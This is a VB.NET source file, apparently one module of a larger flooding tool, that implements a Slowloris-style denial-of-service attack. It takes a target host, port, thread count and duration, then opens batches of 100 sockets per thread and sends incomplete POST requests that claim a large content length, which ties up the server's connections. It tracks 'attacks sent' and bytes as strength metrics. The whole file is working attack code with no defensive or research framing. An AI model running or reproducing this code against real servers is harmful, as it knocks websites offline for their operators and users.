Imports System.Text
Imports System.Threading
Imports System.Net.Sockets
Imports System.Net
Public Class SlowLoris
    Private ThreadsEnded = 0
    Private PostDATA As String
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private Port As Integer
    Private ThreadstoUse As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private RandomFile As Boolean
    Public Sub New(ByVal model As SlowLorisModel)

        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = model.newBaseFloodModel.Host
            Port = model.newSlowLorisVariables.Port
            PostDATA = model.newSlowLorisVariables.PostDATA
            ThreadstoUse = model.newBaseFloodModel.ThreadstoUse
            TimetoAttack = model.newBaseFloodModel.Time
            RandomFile = model.newSlowLorisVariables.RandomFile
            If HostToAttack.Contains("http://") Then HostToAttack = HostToAttack.Replace("http://", String.Empty)
            If HostToAttack.Contains("www.") Then HostToAttack = HostToAttack.Replace("www.", String.Empty)
            If HostToAttack.Contains("/") Then HostToAttack = HostToAttack.Replace("/", String.Empty)


            Threads = New Thread(ThreadstoUse - 1) {}
            GetFloodsBase().Reset()
            GetFloodsBase().SetMessage("Slowloris attack started")
            For i As Integer = 0 To ThreadstoUse - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else
            GetFloodsBase().SetMessage("A Slowloris Attack is Already Running on " & HostToAttack)
        End If
    End Sub
    Private Sub Ended()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
            GetFloodsBase().SetEnd()
        End If

    End Sub

    Public Sub Stoped()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)

        Else
            GetFloodsBase().SetMessage("No Slowloris Attack is Running!")
        End If
    End Sub
    Public Function GenerateRandomString(ByRef len As Integer, ByRef upper As Boolean) As String
        Dim rand As New Random()
        Dim allowableChars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()
        Dim final As String = String.Empty
        For i As Integer = 0 To len - 1
            final += allowableChars(rand.Next(allowableChars.Length - 1))
        Next

        Return IIf(upper, final.ToUpper(), final)
    End Function
    Private Sub DoWork()
        Dim file As String = ""
        Try
            Dim socketArray As Socket() = New Socket(100 - 1) {}
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Do While (stopwatch.Elapsed < span)
                Try
                    Dim i As Integer
                    For i = 0 To 100 - 1

                        If RandomFile Then
                            file = GenerateRandomString(5, True)
                        End If

                        socketArray(i) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                        socketArray(i).Connect(Dns.GetHostAddresses(HostToAttack), Port)
                        Dim HttpString = "POST /" & file & " HTTP/1.1" & ChrW(13) & ChrW(10) & "Host: " & HostToAttack.ToString() & ChrW(13) & ChrW(10) & "Content-length: 5235" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)
                        socketArray(i).Send(ASCIIEncoding.Default.GetBytes(HttpString), SocketFlags.None)

                        GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
                        GetFloodsBase().Set_AttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * HttpString.Length)

                    Next i
                    Dim j As Integer
                    For j = 0 To 100 - 1
                        Dim bytes As Integer = 0
                        Dim sb = New StringBuilder()
                        Dim bytesReceived As Byte() = New Byte(255) {}

                        Do
                            bytes = socketArray(j).Receive(bytesReceived, bytesReceived.Length, 0)
                            sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                        Loop Until bytes > 0

                        GetFloodsBase().Set_AttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * sb.ToString().Length)
                        socketArray(j).Close()
                    Next j
                    Continue Do



                Catch

                    Continue Do
                End Try
            Loop
        Catch : End Try
        Ended()
    End Sub
End Class
